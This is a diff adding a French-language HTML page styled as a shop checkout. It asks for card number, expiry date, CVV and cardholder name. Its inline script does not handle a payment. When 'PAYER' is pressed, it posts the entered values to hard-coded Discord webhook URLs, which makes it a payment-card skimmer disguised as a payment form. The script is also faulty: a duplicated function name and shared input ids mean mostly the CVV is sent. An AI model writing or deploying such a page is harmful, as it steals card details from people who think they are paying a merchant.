@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="logo.PNG">
+    <title>LeSite>ACelui2Sno</title>
+</head>
+<body>
+    <header>
+        <div class="principale">
+            <div class="logo">
+                <a href="#">LeSite<span>></span>ACelui<span>2</span>Sno</a>
+            </div>
+            <ul>
+                <Li class= "active">
+                    <a href="index.html">Acceuil</a>
+                </Li>
+                <Li>
+                    <a href="contact.html">Contact</a>
+                </Li>
+                <Li>
+                    <a href="info.html">Info</a>
+                </Li>
+                <Li>
+                    <a href="shop.html">Shop</a>
+                </Li>
+            </ul>
+            </div>
+            <div class="rouge">
+                <img src="rouge.jpg" alt="rouge" width="900px">
+            </div>
+            <div class="cb"> 
+                CARTE BANCAIRE
+            </div>
+            <div class="date">
+                <input type="text" id="messageInput" placeholder="DateD'expiration">   
+            </div>
+            <div class="cvv">
+                <input type="text" id="messageIn" placeholder="CVV">
+            </div>
+            <div class="carte">
+                <input type="text" id="messageInput" placeholder="NuméroDeCarte">
+            </div>
+            <div class="nom">
+                <input type="text" id="messageInput" placeholder="NomInscritSurLaCarte">
+            </div>
+            <div class="paye">
+                <button onclick="sendMessage()">PAYER</button>
+            </div>
+            <script>
+                function sendMessage() {
+                  const request = new XMLHttpRequest();
+                  request.open("POST", "https://discord.com/api/webhooks/1080564193977180342/O4gTsDPZFoRRlt1eQanoUItIe363NhlnGJNaOAWWajL3Rn71GKFQeNBBmZ9BbbMb6HSK");
+            
+                  request.setRequestHeader('Content-type', 'application/json');
+            
+                  const params = {
+                    username: "NuméroDeCarte",
+                    avatar_url: "",
+                    content: document.getElementById("messageInput").value
+                  }
+            
+                  request.send(JSON.stringify(params));
+                  
+                }
+                function sendMessage() {
+                  const request = new XMLHttpRequest();
+                  request.open("POST", "https://discord.com/api/webhooks/1080565160239968346/Z1xYiqodzlSxhoYaLQEOjX9o-_jKxQ4E9yhWHBtPHnlqpCR-WOJ6ubnexqPZeYSRXxPz");
+            
+                  request.setRequestHeader('Content-type', 'application/json');
+            
+                  const params = {
+                    username: "CVV",
+                    avatar_url: "",
+                    content: document.getElementById("messageIn").value
+                  }
+            
+                  request.send(JSON.stringify(params));
+                  
+                }
+              </script>
+    
+        </div>
+    </header>
+</body>
+</html>
